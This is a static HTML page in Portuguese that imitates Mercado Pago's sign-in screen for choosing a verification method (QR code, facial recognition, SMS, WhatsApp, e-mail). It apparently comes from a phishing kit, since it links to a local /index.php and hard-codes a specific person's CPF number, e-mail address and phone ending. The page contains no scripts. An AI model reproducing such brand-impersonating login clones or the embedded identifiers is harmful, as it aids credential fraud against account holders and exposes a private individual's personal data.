<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Escolha um método de verificação</title>
    <style>
        /* Variáveis de Cor Globais */
        :root {
            --andes-color-yellow-500: #ffe600;
            --andes-color-blue-100: rgba(52, 131, 250, 0.1);
            --andes-color-blue-500: #3483fa;
            --andes-text-color-primary: #333;
            --andes-text-color-secondary: #555;
            --andes-text-color-link: var(--andes-color-blue-500);
            --andes-background-color-primary: #fff;
        }

        /* Estilos Gerais */
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; flex-direction: column; min-height: 100vh; background-color: var(--andes-background-color-secondary); }
        .main-header { background-color: var(--andes-color-yellow-500); padding: 0 650px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); height: 60px; display: flex; align-items: center; justify-content: flex-start; }
        .main-header img { height: 37px; vertical-align: middle; }
        .main-content { padding: 80px 24px; flex-grow: 1; }
        .content-wrapper { max-width: 960px; margin: 0 auto; display: flex; justify-content: center; align-items: flex-start; gap: 64px; }
        
        /* Coluna da Esquerda */
        .left-column { display: flex; flex-direction: column; width: 320px; flex-shrink: 0; margin-right: 64px; }
        .session-start-label { font-size: 12px; font-weight: 600; color: var(--andes-text-color-secondary); text-transform: uppercase; margin-bottom: 8px; }
        .main-title { font-size: 28px; font-weight: 600; color:  var(--andes-text-color-primary); line-height: 1.25; margin: 0; }
        .user-identifier-box { display: flex; align-items: center; gap: 16px; border: 1px solid rgba(0, 0, 0, .1); border-radius: 1.5625rem; padding: 8px 12px; margin-top: 32px; width: fit-content; }
        .icon-wrapper { width: 32px; height: 32px; border-radius: 50%; background-color: var(--andes-color-blue-100); display: flex; align-items: center; justify-content: center; }
        .user-identifier-box .icon-wrapper svg { color: var(--andes-color-blue-500); }
        .identifier-text-block { display: flex; flex-direction: column; }
        .identifier-text-block .cpf-text { font-size: 14px; font-weight: 400; color: var(--andes-text-color-primary); }
        .identifier-text-block .change-account-link { font-size: 13px; color: var(--andes-text-color-link); text-decoration: none; margin-top: 2px; }
        .identifier-text-block .change-account-link:hover { text-decoration: underline; }
        .help-link { display: block; margin-top: 24px; color: var(--andes-text-color-link); text-decoration: none; font-size: 14px; font-weight: 400; }
        .help-link:hover { text-decoration: underline; }

        /* Coluna da Direita (Card de Verificação) */
        .verification-card { width: 100%; max-width: 480px; background-color: var(--andes-background-color-primary); box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 8px 0; box-sizing: border-box; }
        .verification-option { display: flex; align-items: center; gap: 16px; padding: 16px 24px; text-decoration: none; color: inherit; transition: background-color 0.2s; }
        .verification-option:hover { background-color: var(--andes-background-color-secondary); }
        .verification-option .icon-container { width: 40px; height: 40px; border-radius: 50%; background-color: var(--andes-color-blue-100); display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
        
        /* Regras para colorir os SVGs */
        .verification-option .icon-container svg { color: var(--andes-color-blue-500); }
        .verification-option .icon-container svg .channel-icon__shape--filled { fill: currentColor; }
        .verification-option .icon-container svg .channel-icon__shape--stroked { stroke: currentColor; stroke-width: 1.5; fill: none; }
        
        .verification-option .text-content { flex-grow: 1; }
        .verification-option .text-content h3 { margin: 0 0 4px 0; font-size: 16px; font-weight: 500; color: var(--andes-text-color-primary); }
        .verification-option .text-content p { margin: 0; font-size: 14px; color: var(--andes-text-color-secondary); }
        .verification-option .chevron-icon { margin-left: auto; }
        .verification-option .chevron-icon polyline { stroke: var(--andes-color-blue-500); }
        .final-separator { height: 1px; background-color: var(--andes-border-color-secondary); margin: 8px 24px; }
        .cant-login-link { display: block; text-align: left; color: var(--andes-text-color-link); text-decoration: none; font-size: 15px; font-weight: 400; padding: 16px 24px 24px 24px; }
        .cant-login-link:hover { text-decoration: underline; }

    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <div class="content-wrapper">
            <div class="left-column">
                <span class="session-start-label">INÍCIO DE SESSÃO</span>
                <h1 class="main-title">Escolha um método de verificação para iniciar sessão</h1>
                <div class="user-identifier-box">
                    <div class="icon-wrapper">
                        <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.999 15.75C15.7275 15.75 18.75 12.7275 18.75 8.999C18.75 5.27053 15.7275 2.248 11.999 2.248C8.27053 2.248 5.248 5.27053 5.248 8.999C5.248 12.7275 8.27053 15.75 11.999 15.75ZM11.999 14.25C9.09895 14.25 6.748 11.899 6.748 8.999C6.748 6.09895 9.09895 3.748 11.999 3.748C14.899 3.748 17.25 6.09895 17.25 8.999C17.25 11.899 14.899 14.25 11.999 14.25Z"></path><path d="M5.98045 18.75C4.74861 18.75 3.75 19.7486 3.75 20.9804V21.7304H2.25V20.9804C2.25 18.9202 3.92018 17.25 5.98045 17.25H18C20.0711 17.25 21.75 18.9289 21.75 21V21.75H20.25V21C20.25 19.7574 19.2426 18.75 18 18.75H5.98045Z"></path></svg>
                    </div>
                    <div class="identifier-text-block">
                        <span class="cpf-text">CPF: 288.114.198-67</span>
                        <a href="/index.php" class="change-account-link">Trocar conta</a>
                    </div>
                </div>
                <a href="#" class="help-link">Preciso de ajuda</a>
            </div>

            <div class="verification-card">
                
                <a href="#" class="verification-option">
                    <div class="icon-container"><svg class="channel-icon__shape--filled" width="20" height="20" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path d="M11.6871 0H8.32307V6.66142H9.98973V4.97848H11.6667V3.31313H9.98973V1.66536H11.6871V0Z"></path><path d="M11.6564 13.2617V14.9271H9.98973V16.6673H8.32307V11.6712H9.98973V13.2617H11.6564Z"></path><path d="M18.3333 18.3238H20V19.9892H18.3333V18.3238Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M10.0204 10.0097V11.6495H11.6769V13.3384H13.3026V18.3258H18.3026V16.6322H20V14.9668H18.3026V13.3298H13.3435V10.0077H11.6871V6.67894H10.0204V8.34431H6.64621V9.98419H4.95381V8.32483H1.62048V9.93896H0V11.6043H1.66667V9.99018H3.32836V11.6495H6.66169V10.0097H10.0204ZM14.9693 14.9951H16.6359V16.6605H14.9693V14.9951Z"></path><path d="M18.3795 9.99018H16.6769V11.6645H15.0102V9.99018H13.3795V8.32483H18.3795V9.99018Z"></path><path d="M18.3333 10.0077H20V13.3384H18.3333V10.0077Z"></path><path d="M10.0204 16.6693H11.6871V18.3346H13.3538V20H8.35384V18.3346H10.0204V16.6693Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0 0V6.67897H6.62046V0H0ZM4.9538 1.66536H1.66667V5.01361H4.9538V1.66536Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0 13.321H6.62046V20H0V13.321ZM1.66667 14.9864H4.9538V18.3346H1.66667V14.9864Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M13.3591 0.00321877V6.68219H19.9795V0.00321877H13.3591ZM18.3129 1.66857H15.0257V5.01683H18.3129V1.66857Z"></path></svg></div>
                    <div class="text-content"><h3>Código QR</h3><p>Você vai escanear o código com a câmera<br>do seu celular ou pelo app do Mercado </br>Pago.</p></div>
                    <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                </a>

                <a href="#" class="verification-option">
                    <div class="icon-container"><svg class="channel-icon__shape--filled" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path fill-rule="evenodd" clip-rule="evenodd" d="M7.10628 11.6232C6.41183 11.4919 5.8866 10.882 5.8866 10.1493C5.8866 9.61262 6.16849 9.14174 6.59229 8.87667C6.58583 8.80996 6.58018 8.74624 6.57538 8.68594C6.60611 5.97593 8.9729 3.64203 12.0751 3.64203C15.1998 3.64203 17.5751 5.99438 17.5751 8.73935C17.5751 8.76519 17.5749 8.79187 17.5745 8.81935C18.0531 9.06992 18.3798 9.57138 18.3798 10.1491C18.3798 10.8795 17.8578 11.488 17.1665 11.6218C17.093 11.8849 17.016 12.1035 16.9405 12.2626C15.9914 14.2627 14.1299 15.537 12.0751 15.537C10.0793 15.537 8.3293 14.2821 7.33972 12.2492C7.26237 12.0903 7.18335 11.8773 7.10628 11.6232ZM18.2956 12.9057C18.7937 11.856 19.0751 9.83535 19.0751 8.73935C19.0751 5.08141 15.9411 2.14203 12.0751 2.14203C8.20908 2.14203 5.07507 5.09575 5.07507 8.73935C5.15465 9.82061 5.47507 11.8457 5.99102 12.9057C7.1736 15.3351 9.38343 17.037 12.0751 17.037C14.7827 17.037 17.1313 15.3593 18.2956 12.9057Z" class="channel-icon__shape--filled"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M17.6098 11.4429C17.3733 12.067 17.0174 12.6369 16.5682 13.1278C16.665 13.1372 16.7632 13.142 16.8625 13.142C18.5193 13.142 19.8625 11.7989 19.8625 10.142C19.8625 8.63343 18.7489 7.38491 17.299 7.17356C17.6178 7.74952 17.8287 8.3879 17.9059 9.06437C18.1874 9.33705 18.3625 9.7191 18.3625 10.142C18.3625 10.6984 18.0596 11.184 17.6098 11.4429Z" class="channel-icon__shape--filled"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.83764 7.19033C5.4386 7.44471 4.37781 8.66939 4.37781 10.1418C4.37781 11.7987 5.72095 13.1418 7.37781 13.1418C7.47189 13.1418 7.56495 13.1375 7.65682 13.129C7.18867 12.6307 6.81785 12.048 6.57276 11.4077C6.15494 11.1414 5.87781 10.674 5.87781 10.1418C5.87781 9.75946 6.02087 9.41051 6.2564 9.14559C6.31716 8.44672 6.52011 7.78622 6.83764 7.19033Z" class="channel-icon__shape--filled"></path><path d="M22.6027 4.71368V1.32945H19.4891" class="channel-icon__shape--stroked"></path><path d="M1.26428 4.71368V1.32945H4.3778" class="channel-icon__shape--stroked"></path><path d="M1.26428 19.2494V22.6336H4.3778" class="channel-icon__shape--stroked"></path><path d="M22.6027 19.2494V22.6336H19.4891" class="channel-icon__shape--stroked"></path></svg></div>
                    <div class="text-content"><h3>Reconhecimento facial</h3><p>Vamos usar a câmera do seu computador <br>para reconhecer seu rosto.</br></p></div>
                    <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                </a>

                <a href="#" class="verification-option">
                     <div class="icon-container"><svg class="channel-icon__shape--filled" width="20" height="21" viewBox="0 0 20 21" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path d="M5.50006 7.30047H14.5001V5.50047H5.50006V7.30047Z"></path><path d="M10.8986 10.9001H5.50006V9.10007H10.8986V10.9001Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0.101562 13.5995C0.101562 15.0906 1.31039 16.2995 2.80156 16.2995H9.72759L16.3001 20.6806V16.2995H17.1986C18.6897 16.2995 19.8986 15.0906 19.8986 13.5995V2.80107C19.8986 1.30991 18.6897 0.101074 17.1986 0.101074H2.80156C1.31039 0.101074 0.101562 1.30991 0.101562 2.80107V13.5995ZM17.1986 14.4995H14.5001V17.3175L10.2725 14.4995H2.80156C2.30451 14.4995 1.90156 14.0965 1.90156 13.5995V2.80107C1.90156 2.30402 2.30451 1.90107 2.80156 1.90107H17.1986C17.6956 1.90107 18.0986 2.30402 18.0986 2.80107V13.5995C18.0986 14.0965 17.6956 14.4995 17.1986 14.4995Z"></path></svg></div>
                    <div class="text-content"><h3>SMS</h3><p>Vamos enviar um código para o telefone<br>terminado em 3819.</br></p></div>
                    <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                </a>

                <a href="#" class="verification-option">
                    <div class="icon-container"><svg class="channel-icon__shape--filled" width="25" height="24" viewBox="0 0 25 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path d="M2.01229 17.8374C0.934723 16.0295 0.368801 13.9788 0.371578 11.8919C0.37423 5.33471 5.88817 0 12.6634 0C15.9248 0.000528957 19.0523 1.25486 21.3577 3.48692C23.663 5.71898 24.9572 8.74584 24.9554 11.9013C24.9526 18.4586 19.438 23.7938 12.6637 23.7938H12.6586C10.6064 23.7937 8.58686 23.2961 6.78462 22.3463L0.268555 24L2.01229 17.8374ZM7.45946 20.4075C9.0337 21.3096 10.8297 21.7853 12.6594 21.7853H12.6635C18.2946 21.7853 22.8774 17.3509 22.8799 11.9005C22.8815 9.27849 21.8065 6.76325 19.8913 4.90813C17.9761 3.05302 15.3777 2.01001 12.6676 2.00856C7.03227 2.00856 2.44914 6.44252 2.44683 11.8925C2.44401 13.7535 2.98548 15.5772 4.0087 17.153L4.25158 17.527L3.21952 21.1746L7.08626 20.1932L7.45946 20.4075ZM14.6695 17.4375C14.0748 17.2589 13.4904 17.05 12.9186 16.8117C9.8376 15.5244 7.82546 12.523 7.67187 12.3247C7.51828 12.1263 6.41773 10.7134 6.41773 9.25067C6.41773 7.78795 7.21115 7.06921 7.4927 6.77166C7.70019 6.54255 7.99719 6.40774 8.31193 6.39981C8.51663 6.39981 8.72161 6.40163 8.90055 6.4103C8.92271 6.41139 8.94581 6.41122 8.96968 6.4111C9.14862 6.41013 9.37158 6.40922 9.5916 6.92033C9.84756 7.51537 10.4618 8.9781 10.5386 9.12687C10.6154 9.27565 10.6666 9.44911 10.5642 9.6475C10.4618 9.84589 10.4106 9.96969 10.2571 10.1432C10.1035 10.3167 9.93456 10.5306 9.79635 10.6638C9.64269 10.812 9.48256 10.9729 9.66179 11.2702C9.84102 11.5676 10.4575 12.5408 11.3703 13.3288C12.5432 14.3412 13.5331 14.655 13.8403 14.8037C14.1474 14.9525 14.3265 14.9276 14.5056 14.7296C14.6847 14.5316 15.2734 13.8619 15.4781 13.5644C15.6827 13.2669 15.8876 13.3165 16.169 13.4156C16.4504 13.5148 17.9607 14.2337 18.2677 14.3824C18.5747 14.5312 18.7796 14.6056 18.8563 14.7296C18.933 14.8536 18.9329 15.4484 18.6772 16.1427C18.4216 16.837 17.1942 17.4703 16.6042 17.5556C16.3575 17.5925 16.1083 17.6116 15.8587 17.6126C15.4553 17.6142 15.0541 17.5551 14.6695 17.4375Z"></path></svg></div>
                    <div class="text-content"><h3>WhatsApp</h3><p>Vamos enviar um código para o telefone<br> terminado em 3819.</br></p></div>
                    <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                </a>
                
                <a href="#" class="verification-option">
                    <div class="icon-container"><svg class="channel-icon__shape--filled" width="24" height="14" viewBox="0 0 24 14" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path fill-rule="evenodd" clip-rule="evenodd" d="M0.75 0.25H23.25V13.75H0.75V0.25ZM2.25 3.79417V12.25H21.75V3.79417L13.8601 8.30121C12.7074 8.95964 11.2926 8.95964 10.1399 8.30121L2.25 3.79417ZM2.25 2.06669L10.884 6.99874C11.5755 7.39379 12.4245 7.39379 13.116 6.99874L21.75 2.06669V1.75H2.25V2.06669Z"></path></svg></div>
                    <div class="text-content"><h3>E-mail</h3><p>Vamos enviar um código para nivaldaalmeida22@gmail.com.</p></div>
                    <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                </a>

                <div class="final-separator"></div>
                
                <a href="#" class="cant-login-link">Não consigo iniciar sessão</a>
            </div>
        </div>
    </main>

</body>
</html>